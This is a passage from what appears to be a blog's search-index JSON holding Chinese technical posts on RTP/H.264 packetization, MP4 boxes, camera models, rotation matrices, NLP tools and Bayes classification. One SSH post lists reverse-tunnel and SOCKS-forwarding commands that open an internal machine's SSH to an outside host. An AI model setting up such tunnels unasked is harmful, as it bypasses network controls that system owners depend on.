值存放空间不同，前者为16bit，而后者为24bit。\n分片组合：\n当使用udp传输rtp包时，由于一个udp的荷载最大为1480个字节，当一个nalu大于1480时，就需要将一个nalu分割为多个rtp包进行传输，具体的分割方式有以下两种。\nFU-A\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | FU indicator | FU header | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | | | FU payload | | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ FU-B\n0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | RTP Header | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | FU indicator | FU header | DON | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-| | | | FU payload | | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | :...OPTIONAL RTP padding | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 其中 FU indicator\n+---------------+ |0|1|2|3|4|5|6|7| +-+-+-+-+-+-+-+-+ |F|NRI| Type | +---------------+ F: 1 bit forbidden_zero_bit，h264语法规定值为0。rtp封包中，当检测到值为1时，则表示该nalu中已出现错误。\nNRI: 2 bits nal_ref_idc, 当值为00时，表示后面的负载可以丢弃，并不会影响正常解码，当大于00时后面的该包丢弃会影响解码，不可丢弃。rtp封包中，该值也表示该数据包的重要性，11为重要性最高。\nType: 5bit rtp包中nalu type，可取值为28(FU-A)，29(FU-B)。\nFU header +---------------+ |0|1|2|3|4|5|6|7| +-+-+-+-+-+-+-+-+ |S|E|R| Type | +---------------+ S: 1 bit 值为1表示该rtp包为nalu的开始。\nE: 1 bit 值为1表示该rtp包为nalu的结束。\nR: 1 bit 保留字段。\nType: 5bit 表示h264中的nalu type 可取值1-23。\n从分片恢复 NALU header:\nnal_unit_type = (fu_indicator \u0026amp; 0xe0) | (fu_header \u0026amp; 0x1f) 一个全局的 NAL RTP 打包结构图如下：\nNALU：主体数据打包进 RTP Slice Header: 包含分片类型、分片中的宏块类型、分片帧的数量以及对应的帧的设置和参数等信息 Slice Data: 宏块信息 宏块：宏块类型、预测类型、Coded Block Pattern、Quantization Parameter、像素的亮度和色度数据集等等信息 3.2.SDP (ISO/IEC 14496-1) 使用 SDP 传输 ISO/IEC 14496-1 定义的内容\n3.3.MIME type 互联网媒体类型 (Internet media type，也称为 MIME type），给互联网上传输的内容进行分类。\nMIME type 格式为：\u0026lt;类型\u0026gt;/\u0026lt;子类型\u0026gt;; [可选参数]\n例如：\ntext/html; charset = UTF-8 video/mp4 以下是常用的视频类 MIME type：\nvideo/mpeg：MPEG-1视频文件\nvideo/mp4：MP4视频文件\nvideo/ogg：Ogg视频文件\nvideo/quicktime：QuickTime视频文件\nvideo/webm：WebM视频文件（基于Matroska基础）\nvideo/x-matroska：Matroska（多媒体封装格式）\nvideo/x-ms-wmv：Windows Media Video视频文件\nvideo/x-flv：Flash Video（FLV档）\n4.MP4: 第十四部分（ISO/IEC 14496-14） MP4 文件由可以嵌套的 box 组成，每个 box 有 header 和 data，header 定义 box 的类型和大小，data 包含数据或者子 box。\n一个典型的视频文件格式如下：\n1 2 3 4 5 6 7 类型 描述 ftyp 数据 box 描述文件类型、版本等信息 mdat 数据 box Media Data 媒体数据 moov 嵌套 box Movie box，用来存放每个媒体轨道的描述信息 moov mvhd 数据 box Movie Header box，记录整个媒体文件信息，如创建时间、修改时间、时间度量标尺、时长等 moov udta 嵌套 box User Data box，用户自定义信息 moov trak 嵌套 box Track box，记录每个轨道的信息 moov trak tkhd 数据 box Track Header box，轨道的头信息，如创建/修改时间、时长、画面宽度/高度等 moov trak mdia 嵌套 box Media box，媒体信息 moov trak mdia mdhd 数据 box Media Header box，记录创建时间、时长等信息， moov trak mdia hdlr 数据 box Handler Reference box，媒体播放过程信息 moov trak mdia minf 嵌套 box Media Information box moov trak mdia minf vmhd 数据 box 视频媒体头信息，smhd：针对音频 moov trak mdia minf stbl 嵌套 box Sample Table box，媒体数据的索引信息，找到视频的帧数据可以从这里获取 moov trak mdia minf stbl stsd 嵌套 box sample description, 给出视频、音频的编码、宽高、音量等信息，以及每个sample中包含多少个frame moov trak mdia minf stbl stco 数据 box chunk offset, chunk（一个chunk 包含多个 sample，一个 sample 对应一帧） 在文件中的偏移 moov trak mdia minf stbl stsc 数据 box sample-to-chunk, chunk 中包含 sample 的数量 moov trak mdia minf stbl stsz 数据 box sample size, 每个 sample 的 size 信息 moov trak mdia minf stbl stts 数据 box time-to-sample，时间戳到 sample 的映射，每个 sample 的时长 moov trak mdia minf stbl stss 数据 box sync sampel table, 可以随机访问的 sample 列表（记录哪些 sample 是关键帧） moov trak mdia minf stbl ctts 数据 box 帧解码到渲染的时间差，针对 B 帧 5.其他 5.1.MPEG-7 来自 wikipedia:\nMPEG-7并不是一个视频压缩标准，它是一个多媒体内容的描述标准。\n来自 mpeg.org:\nISO/IEC 15938 Multimedia content description interface\nA suite of standards for description and search of audio, visual and multimedia content\n5.2.MPEG-21 来自 wikipedia:\nMPEG-21标准的正式名称为“多媒体框架”,它致力于为多媒体传输和使用定义一个标准化的、可互操作的和高度自动化的开放框架，这个框架考虑到了对象化的多媒体接入以及使用不同的网络和终端进行传输等问题。 MPEG-21标准将各种不同协议、标准和技术融合在一起，透过这种统一环境对全球媒体资源进行统一和管理，进而完整著作权保护、用户隐私权保护、终端和网络资源撷取及事件报告等功能。\n来自 mpeg.org:\nISO/IEC 21000 Multimedia framework\nA suite of standard that define a normative open framework for end-to-end multimedia creation, delivery and consumption that provides content creators, producers, distributors and service providers with equal opportunities in the MPEG-21 enabled open market, and also be to the benefit of the content consumers providing them access to a large variety of content in an interoperable manner.\n6.参考资料 https://zh.wikipedia.org/wiki/MPEG-1 https://zh.wikipedia.org/wiki/MPEG-2 https://zh.wikipedia.org/wiki/MPEG-3 https://zh.wikipedia.org/wiki/MPEG-4 https://www.mpeg.org/standards/MPEG-7/ https://www.mpeg.org/standards/MPEG-21/ https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E5%AA%92%E4%BD%93%E7%B1%BB%E5%9E%8B https://juejin.cn/post/6844904083904528392#heading-1 https://slideplayer.com/slide/2409533/ https://zhuanlan.zhihu.com/p/402346767 https://www.cnblogs.com/yinxiangpei/articles/2821954.html https://zhuanlan.zhihu.com/p/355803589 ", 
    "url": "http:\/\/localhost:1313\/post\/cv\/video-media-container\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/camera-intrinsic\/": {
        
        "title": "Camera Intrinsic",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/camera-intrinsic\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/camera-model\/": {
        
        "title": "Camera Model",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/camera-model\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/cv\/": {
        
        "title": "Cv",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/cv\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/cv\/": {
        
        "title": "CV",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/cv\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/essential-matrix\/": {
        
        "title": "Essential Matrix",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/essential-matrix\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/math\/": {
        
        "title": "Math",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/math\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/cv\/camera-model\/": {
        
        "title": "摄像机模型及实现",
            "tags": [ "cv",  "camera model",  "camera intrinsic",  "essential matrix", ],
    "content": " 3D 设计软件和游戏中的图像经常是以一个观测者的角度展示的，可以把这个过程想象成一个人拿着一台摄像机在拍摄，在机器视觉中叫摄像机模型。\n研究过程中基于 OpenCV 做了一个简单实现，项目代码可以在这里下载到 “github 代码下载”，欢迎大家下载交流。\n摄像机模型的数学模型 座标系 理解摄像机模型需要建立对应的座标系，在这个模型里面涉及到了下面 3 个座标系：\n世界座标系 (World frame)\n被观测目标存在于世界座标系中，使用世界座标系座标表示位置，是个 3 维座标系，可以使用常用的单位，比如‘米’。\n相机座标系 (Camera frame)\n通常使用摄像机的光学中心为原点，是一个 3 维座标系，表示从相机的光学中心原点来衡量各个目标的位置，尺度可以保持和世界座标系统一，比如都使用‘米’；相机可以移动到世界座标系中的任意位置和任意角度（姿态）。\n像平面座标系 (Image plane frame)\n这是最终观测的图像座标系，是一个 3 维座标系，在相机中是 CCD 的座标系，例如以左上角为原点，尺度为‘像素’。\n座标转换 当移动摄像机时，摄像机成像的结果可以通过座标转换来完成：\n把世界座标系中的物体座标进行\u0026rsquo;座标系变换\u0026rsquo;，转换成相机座标系中的座标 通过相机内参转换到像平面座标系 座标系变换过程 世界座标 $O_w$ 用下面形式表示:\n$$ \\left( \\begin{matrix} X_w \\\\ Y_w \\\\ Z_w \\end{matrix} \\right) $$ 摄像机在世界座标系中被移动到 $t$ 位置：\n$$ \\left( \\begin{matrix} x_t \\\\ y_t \\\\ z_t \\end{matrix} \\right) $$ 第一步：先抵消掉摄像机的空间移动 $t$，也就是 $O_w - t$。这一步后新的座标系与摄像机座标系原点重叠。\n第二步：旋转座标系第一步后的新座标系到摄像机座标座标系，旋转矩阵 $R$ ，关于座标旋转参见旋转矩阵，完成旋转后得到了摄像机座标系下的座标 $O_c$\n相机座标转化到像平面座标 先看一下小孔成像模型，使用虚拟像平面可以把座标转换简化。\n简化后的模型如下图：\n摄像机座标系与虚拟像平面交于点 $(x_o, y_o)$，摄像机座标系下的点 $O_c$ 在虚拟像平面上的投影点是 $(x\u0026rsquo;, y\u0026rsquo;)$\n通过相似三角形可以容易得到：$ x\u0026rsquo; \\over X_c $ = $ y\u0026rsquo; \\over Y_c $ = $ f \\over Z_c $，也就是：\n$$ x‘ = f \\frac {X_c} {Z_c} $$ $$ y’ = f \\frac {Y_c} {Z_c} $$ $$ z‘ = f \\frac {Z_c} {Z_c} $$ 在摄像机虚拟像平面座标系下（左上角为原点，像素为单位），摄像机座标系与虚拟像平面的交点像素座标为 $(x_o, y_o)$，摄像机座标系下的点 $O_c$ 在虚拟像平面上投影点像素级座标是 $(x, y)$，摄像机 CCD 的像素点在 x 和 y 轴方向上的排列密度为 $\\sigma_x$ （单位：pixels/meter）和 $\\sigma_y$ （单位：pixels/meter），那么：\n中间式子可以写成下面形式：\n通过逆矩阵运算得到：\n再把第一个矩阵拆成下面的形式：\n再做矩阵逆运算得到：\n摄像机数学模型 现在已经有了一个摄像机的数学模型：\n**第一步：**把观察目标从世界坐标旋转到摄像机坐标\n**第二步：**把摄像机坐标转换到摄像机虚拟像平面像素坐标\n1/Z \\left( \\begin{matrix} f \\sigma_x\t\u0026amp;\t0\t\u0026amp;\tx_o \\\\ 0\t\u0026amp;\tf \\sigma_y\t\u0026amp;\ty_o \\\\ 0\t\u0026amp;\t0\t\u0026amp;\t1 \\end{matrix} \\right) \\left( \\begin{matrix} X_c \\\\ Y_c \\\\ Z_c \\end{matrix} \\right) $$\n实现一个摄像机模型 **第一步：**世界坐标系到相机坐标系转换\n根据摄像机旋转角度计算出旋转矩阵 R：\ndef rotate(self, roll, pitch, yaw): \u0026#39;\u0026#39;\u0026#39; Rotate camera by roll, pitch, yaw \u0026#39;\u0026#39;\u0026#39; rx, _ = cv2.Rodrigues((pitch, 0, 0)) Rodrigues(src, dst=None, jacobian=None, /) -\u0026gt; dst, jacobian 被观测物体的世界坐标转换到相机坐标：\ndef trans_to_cam(self, v): \u0026#39;\u0026#39;\u0026#39; Transform the world coordinate vertices to camera coordinate vertices v: vertices in world coordinate frame \u0026#39;\u0026#39;\u0026#39; vc = np.dot(self.R, (v.T - np.array([[self._x], [self._y], [self._z]]))) return vc.T **第二步：**把相机坐标投影到相机虚拟像平面上\n定义相机内参：包括焦距、CCD像素密度参数，写出相机内参矩阵\n# camera focus length in meter self._f = 1 # scale factor: pixels/meter self._s = 800 # camera intrinsic matrix self.intrinsic = np.array([[self._f*self._s, 0, self._canvas_width/2.0], [0, self._f*self._s, self._canvas_height/2.0], [0, 0, 1]]) 进行投影转换计算。**注：**由于程序实现时世界/相机坐标系采用的是右手Z轴向前的形式，因此计算结果多了一步转换的运算。\ndef project(self, v): \u0026#39;\u0026#39;\u0026#39; Project the vertices of camera coordinate to camera image plane coordinate v: vertices in camera coordinate frame u = width - f*(Y/X) v = height - f*(Z/X) \u0026#39;\u0026#39;\u0026#39; Z = np.expand_dims(v[:, -1], axis=1) proj_v = np.dot(self.intrinsic, v.T) / Z proj_v = proj_v.T proj_v[:, 0:2] = [self._canvas_width, self._canvas_height] - proj_v[:, 0:2] return proj_v[:, :2] Demo：\n参考 CS231A 鲁鹏 DD2429 from KTH ", 
    "url": "http:\/\/localhost:1313\/post\/cv\/camera-model\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rotation-matrix\/": {
        
        "title": "Rotation Matrix",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rotation-matrix\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/robotics\/rotation_matrix\/": {
        
        "title": "旋转矩阵",
            "tags": [ "rotation matrix",  "旋转矩阵", ],
    "content": " 计算机图形学中的仿射变换包括平移、缩放、旋转等，在机器人位置描述的时候也需要使用到平移、旋转。这里主要介绍旋转的处理方法。\n先举个简单例子 设想一个二维平面空间里的“一个点”状机器人的简单情况，最初机器人位于平面直角坐标系中的 (1, 0) 点，先让机器人围绕着原点旋转角度 $\\phi$ ，那么机器人的新的位置坐标可以很容易的用以下方式来表示:\n$$ (cos(\\phi), sin(\\phi)) $$ 让机器人再从刚才的位置继续旋转 $\\theta$ 角，那么机器人的新的位置坐标也很直观的用下面式子表示：\n$$ (cos(\\phi+\\theta), sin(\\phi+\\theta)) $$ 复杂一点的例子 在平面直角坐标系下，如果机器人不再是一个简单的点而是一个平面，那么机器人躯干中的任意一个点 (x, y) 经过旋转后在原平面直角坐标系下的新坐标是什么？\n旋转矩阵 二维平面直角坐标系旋转矩阵推导 机器人躯干上的任意点 (x, y) 对应向量 v，旋转 $\\theta$ 后的位置计作 (x\u0026rsquo;, y\u0026rsquo;)对应新的向量 v\u0026rsquo;。\n那么：\n三角和差化积公式:\n$$ cos(\\phi+\\theta) = cos(\\phi)*cos(\\theta) - sin(\\phi)*sin(\\theta) $$ $$ sin(\\phi+\\theta) = sin(\\phi)*cos(\\theta) + cos(\\phi)*sin(\\theta) $$ 带入和差化积公式后：\n用矩阵的方法书写上面的公式：\n旋转矩阵 \u0026lsquo;R\u0026rsquo;：\n二维平面之交坐标系旋绕任一点旋转 思路如下：\n步骤 (a)：找到旋转点在原坐标系中的坐标 (x, y) 步骤 (b)：把坐标系平移到(x,y)后重新计算新的坐标 步骤 (c)：对新的坐标进行旋转 步骤 (d)：把结果进行反向平移 思考：平移是否可以用矩阵进行计算呢，如果可以的话会有什么好处呢？\n平移矩阵 平移： 把任意点 (x, y) 平移 (tx, ty) 的到新的点 (x\u0026rsquo;, y\u0026rsquo;) $$ x' = x + tx $$ $$ y' = y + ty $$ 使用齐次坐标进行矩阵表达：\n所以，平移可以通过平移矩阵来表示。\n如何用矩阵的形式表示绕任意点旋转呢？\n第一步：把平面上的点平移(-tx, -ty) 第二步：使用旋转矩阵进行旋转。注意，这里需要使用齐次矩阵 第三步：把平面上的点平移 (tx, ty) 整体如下：\n利用上面的旋转平移矩阵可以很方便的计算出 x\u0026rsquo; 和 y'\n三维旋转矩阵 绕 X 轴转 $\\theta$ 的旋转矩阵： $$ x' = x $$ 因此：\n绕 Y 轴转 $\\theta$ 的旋转矩阵： 绕 Z 轴转 $\\theta$ 的旋转矩阵： 代码实验 ", 
    "url": "http:\/\/localhost:1313\/post\/robotics\/rotation_matrix\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/nlp\/nlp_resources\/": {
        
        "title": "NLP 资源整理",
            "tags": [ "tag1",  "tag2", ],
    "content": " 模型 模型 项目 论文 描述 GloVe: Global Vectors for Word Representation https://nlp.stanford.edu/projects/glove/ https://nlp.stanford.edu/pubs/glove.pdf The Annotated Transformer http://nlp.seas.harvard.edu/2018/04/03/attention.html GPT (from OpenAI) https://github.com/openai/finetune-transformer-lm language understanding Improving Language Understanding with Unsupervised Learning GPT-2 (from OpenAI) https://github.com/openai/gpt-2 https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf Better Language Models and Their Implications Transformer-XL (from Google/CMU) https://github.com/kimiyoung/transformer-xl Transformer-XL: Attentive Language Models Beyond a Fixed-Length Context Attentive Language Models Beyond a Fixed-Length Context XLNet (from Google/CMU) https://github.com/zihangdai/xlnet/ XLNet: Generalized Autoregressive Pretraining for Language Understanding XLM (from Facebook) https://github.com/facebookresearch/XLM/ Cross-lingual Language Model Pretraining RoBERTa (from Facebook) https://github.com/pytorch/fairseq/tree/master/examples/roberta Robustly Optimized BERT Pretraining Approach DistilBERT (from HuggingFace) https://github.com/huggingface/transformers/tree/master/examples/distillation Smaller, faster, cheaper, lighter: Introducing DistilBERT, a distilled version of BERT bert https://github.com/google-research/bert https://arxiv.org/abs/1810.04805 项目 项目 模型 论文 描述 https://allennlp.org https://github.com/didi/delta https://arxiv.org/pdf/1908.01853.pdf 滴滴 Delta https://nlp.stanford.edu/software/CRF-NER.html CRF Stanford CRF NER 项目 模型 论文 描述 https://nlp.stanford.edu/projects/glove/ GloVe: Global Vectors for Word Representation https://nlp.stanford.edu/pubs/glove.pdf http://nlp.seas.harvard.edu/2018/04/03/attention.html The Annotated Transformer https://github.com/huggingface/transformers Transformers https://huggingface.co/transformers 实现了很多模型（Bert, GPT, GPT-2, Transformer-XL, XLNet, XLM, RoBERTa, DistilBERT）\u0026lt;\\b\u0026gt; https://transformer.huggingface.co https://github.com/openai/finetune-transformer-lm GPT (from OpenAI) language understanding Improving Language Understanding with Unsupervised Learning https://github.com/openai/gpt-2 GPT-2 (from OpenAI) https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf Better Language Models and Their Implications https://github.com/kimiyoung/transformer-xl Transformer-XL (from Google/CMU) Transformer-XL: Attentive Language Models Beyond a Fixed-Length Context Attentive Language Models Beyond a Fixed-Length Context https://github.com/zihangdai/xlnet/ XLNet (from Google/CMU) XLNet: Generalized Autoregressive Pretraining for Language Understanding https://github.com/facebookresearch/XLM/ XLM (from Facebook) Cross-lingual Language Model Pretraining https://github.com/pytorch/fairseq/tree/master/examples/roberta RoBERTa (from Facebook) Robustly Optimized BERT Pretraining Approach https://github.com/huggingface/transformers/tree/master/examples/distillation DistilBERT (from HuggingFace) Smaller, faster, cheaper, lighter: Introducing DistilBERT, a distilled version of BERT https://github.com/google-research/bert bert https://arxiv.org/abs/1810.04805 https://github.com/hundredblocks/concrete_NLP_tutorial An NLP workshop by Emmanuel Ameisen (@EmmanuelAmeisen), from Insight AI https://github.com/BrikerMan/Kashgari Word2Vec, BERT, and GPT2 Kashgari is a Production-ready NLP Transfer learning framework for text-labeling and text-classification, includes Word2Vec, BERT, and GPT2 Language Embedding. https://github.com/kyzhouhzau/BERT-NER Bert 基于 CoNLL-2003 数据集的实现 https://github.com/ProHiryu/bert-chinese-ner 基于人民日报数据集的实现 https://github.com/macanv/BERT-BiLSTM-CRF-NER bert training, serving 项目 描述 https://github.com/marcotcr/lime 用于解释机器学习的分类器。论文：https://arxiv.org/abs/1602.04938 数据集 数据集 描述 https://github.com/SophonPlus/ChineseNlpCorpus https://github.com/SophonPlus/ChineseWordVectors ChnSentiCorp_htl_all https://github.com/thunlp/CAIL Chinese AI \u0026amp; Law Challenge http://cail.cipsc.org.cn NER 数据集 数据集 描述 https://github.com/ontonotes/conll-formatted-ontonotes-5.0 This is a CoNLL formatted version of the OntoNotes 5.0 release. https://github.com/juand-r/entity-recognition-datasets#references A collection of corpora for named entity recognition (NER) and entity recognition tasks. These annotated datasets cover a variety of languages, domains and entity types. 学习资料 NLP roadmap https://github.com/graykode/nlp-roadmap\nProbability \u0026amp; Statistics Machine Learning Text Mining Natural Language Processing 标注工具 | 工具 | 链接 | 描述 | |\u0026mdash;+\u0026mdash;+\u0026mdash;| | Prodigy |https://prodi.gy/docs/|Prodigy (explosion.ai 开发 spacy 的公司)| | brat |https://github.com/nlplab/brat|| | Knowtator |http://knowtator.sourceforge.net/index.shtml|| | Protégé + Knowtator plugin |https://github.com/UCDenver-ccp/Knowtator-2.0 https://protege.stanford.edu/short-courses.php|| ||http://deepdive.stanford.edu/labeling|| ||https://github.com/SongRb/DeepDiveChineseApps|| ||https://github.com/qiangsiwei/DeepDive_Chinese|| ||https://github.com/jiesutd/SUTDAnnotator|| ||https://github.com/HazyResearch/snorkel|| ||https://bitbucket.org/dainkaplan/slate/|| | iepy | https://github.com/machinalis/iepy | 标注，信息提取 | | doccano |https://github.com/chakki-works/doccano|| | YEDDA |https://github.com/jiesutd/YEDDA|| | Chinese-Annotator | https://github.com/deepwel/Chinese-Annotator | online/offline 结合的中文标注工具，想法比较好，目前项目还不完善 | | HanNLP | https://github.com/hankcs/HanLP | NLP 工具箱（中文分词 词性标注 命名实体识别 依存句法分析 新词发现 关键词短语提取 自动摘要 文本分类聚类 拼音简繁），Java语言 | | poplar |https://github.com/synyi/poplar|国内“森亿”公司开发|\nbrat brat 配置 Annotation 配置 annotation.conf [entities] [entities]\tPerson Location Organization [relations] 参数指定格式 \u0026ldquo;ARG:TYPE\u0026rdquo;\n[relations]\tFamily\tArg1:Person, Arg2:Person Employment\tArg1:Person, Arg2:Organization 参数可以有多个，使用 \u0026ldquo;|\u0026rdquo; 分隔\n[relations]\tLocated\tArg1:Person,\tArg2:Building|City|Country Located\tArg1:Building,\tArg2:City|Country Located\tArg1:City,\tArg2:Country [events] 事件参数格式 \u0026ldquo;ROLE:TYPE\u0026rdquo;, ROLE 可以任意指定。\n[events]\tMarriage\tParticipant1:Person, Participant2:Person Bankruptcy\tOrg:Company [attributes] 属性作用域 \u0026ldquo;ARG:TYPE\u0026rdquo; ，可以用在 relation 和 event 中。\n拥有多个值的属性的值的定义方法是 \u0026ldquo;Value:VAL1|VAL2|VAL3[\u0026hellip;]\u0026rdquo;\n[attributes]\tNegated\tArg:\u0026lt;EVENT\u0026gt; Confidence\tArg:\u0026lt;EVENT\u0026gt;, Value:L1|L2|L3 brat 标注信息格式 http://brat.nlplab.org/standoff.html\nT1\tOrganization 0 4\tSony T2\tMERGE-ORG 14 27\tjoint venture T3\tOrganization 33 41\tEricsson E1\tMERGE-ORG:T2 Org1:T1 Org2:T3 T4\tCountry 75 81\tSweden R1\tOrigin Arg1:T3 Arg2:T4 Protege \u0026amp; Knowtator 编译 Knowtator 插件：\ngit clone https://github.com/UCDenver-ccp/Knowtator-2.0.git mvn clean install cp xxx/plugins/knowtator-2.1.5.jar /Applications/Protégé.app/Contents/Java/plugins/ 重启 Protege\niepy NOTE\niepy 的 preprcess.py 会失败，需要按照以下方式修改 corenlp.sh 脚本\nPreprocess not running under MacOS\nProblems with the preprocess under MacOS? Apparently a change in the CoreNLP script is needed to be run. You need to change the file corenlp.sh that is located on /Users//Library/Application Support/iepy/stanford-corenlp-full-2014-08-27/ and change scriptdir=dirname $0 for scriptdir=dirname \u0026quot;$0\u0026quot; (ie, add double quotes around $0)\nhttps://iepy.readthedocs.io/en/stable/troubleshooting.html#troubleshooting\n自然语言处理工具 自然语言处理 中文分词 词性标注 命名实体识别 依存句法分析 新词发现 关键词短语提取 自动摘要 文本分类聚类 拼音简繁\nhttps://github.com/hankcs/HanLP\nNLP 应用 聊天机器人 用 TensorFlow 做个聊天机器人 论文 http://nlp.seas.harvard.edu/2018/04/03/attention.html\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/nlp\/nlp_resources\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/network\/": {
        
        "title": "Network",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/network\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/": {
        
        "title": "Network",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/network\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/proxy\/": {
        
        "title": "Proxy",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/proxy\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ssh\/": {
        
        "title": "Ssh",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ssh\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/ssh\/": {
        
        "title": "Ssh",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/ssh\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/advanced-ssh\/": {
        
        "title": "ssh代理方法",
            "tags": [ "ssh",  "proxy", ],
    "content": " SOCKS 代理 在本地打开 11087 端口，通过该端口可以使用 socks4/socks5 协议连接到目标机（1.2.3.4）\nalias proxy=\u0026#39;ssh -D 11087 -fnqN user@1.2.3.4\u0026#39; ssh 反向连接 当不方便从外连接到内部网络的机器时可以在内部机器上使用反向连接的方式连接到的方式打通外部机器到内部机器的 ssh 通道\nssh -p 22 -qngNTR 10000:localhost:22 proxyuser@proxynode ssh 反向连接时建立 SOCKS 代理 ssh -p 10000 -qngfNTD 6767 nodeuser@localhost ssh 传递连接 ssh -qngfNT -L localhost:6868:localhost:6767 proxyuser@proxynode 将本机的 6868 端口接收到的数据发送到 proxynode 机器所在的 localhost:6767 端口，因为 6767 是 SOCK5 反向连接到了另一台机器，因此 6868 的流量实际被发到了另外的那一台机器上。\n", 
    "url": "http:\/\/localhost:1313\/post\/network\/advanced-ssh\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/bayes\/": {
        
        "title": "Bayes",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/bayes\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/classification\/": {
        
        "title": "Classification",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/classification\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/machine-learning\/": {
        
        "title": "Machine Learning",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/machine-learning\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%88%86%E7%B1%BB\/": {
        
        "title": "分类",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%88%86%E7%B1%BB\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/bayes-classification\/": {
        
        "title": "机器学习笔记 - 贝叶斯分类法推导",
            "tags": [ "Bayes",  "贝叶斯",  "分类", ],
    "content": " 这篇笔记记录了最近对贝叶斯分类法的学习和理解。\n1.概率基本概念回顾 1.1.概率： 事件发生的概率 = $ \\dfrac{事件可能发生的个数} {结果的总数} $\n1.2.事件的分类： 独立事件：每个事件的发生是独立的，不受其他事件的影响，例如：抛硬币，掷骰子。 相关事件：当前事件受之前发生事件的影响，例如：抽扑克牌。 互斥事件：事件发生只能是其一，不能同时发生，例如：一枚硬币不能同时为正面和反面。 1.3.独立事件的概率： 单个独立事件的概率： P(A) = $ \\dfrac{事件可能发生的个数} {结果的总数} $ 事件A和B发生的概率（多个独立事件的概率）： P(A B) = P(A) * P(B) 1.4.条件概率： 在相关事件的情况中应用条件概率，用 P(B|A) 表示在事件 A 发生的条件下事件 B 发生的概率。\n事件A和B发生的概率： P(A B) = P(A) * P(B|A)\n另外一个有用的公式转换： P(B|A) = $ \\dfrac{P(A B)} {P(A)} $\n在事件 A 发生的情况下 B 发生的概率等于事件 A 和 B 的概率除以事件 A 的概率\n例子：冰淇淋\n在你的社交群组里，70% 喜欢巧克力冰淇淋，35% 喜欢巧克力和草莓。 在喜欢巧克力的人里，也喜欢草莓的百分比是多少？ P(草莓|巧克力) = P(巧克力 与 草莓) / P(巧克力) 0.35 / 0.7 = 50% 在喜欢巧克力的人里，50% 也喜欢草莓 1.4.1. 尝试计算下面的概率 4个人在5个数字中各选一个数字，请问任何两个人选重的概率是多少？\n2.贝叶斯定理 $ P(A|B) = \\dfrac {P(A)*P(B|A)} {P(B)} $\n在 B 发生的情况下发生 A 事件的概率 P(A|B) 可以通过已知 A 发生情况下 B 发生的概率和 A 与 B 的独自发生的概率求出来。\nP(A|B)：在 B 发生的情况下 A 发生的概率 P(A)：A 发生的概率 P(B)：B 发生的概率 P(B|A)：在 A 发生的情况下 B 发生的概率 **例子1：**计算天气有云时下雨的概率：\n$ P(雨|云) = \\dfrac {P(雨)*P(云|雨)} 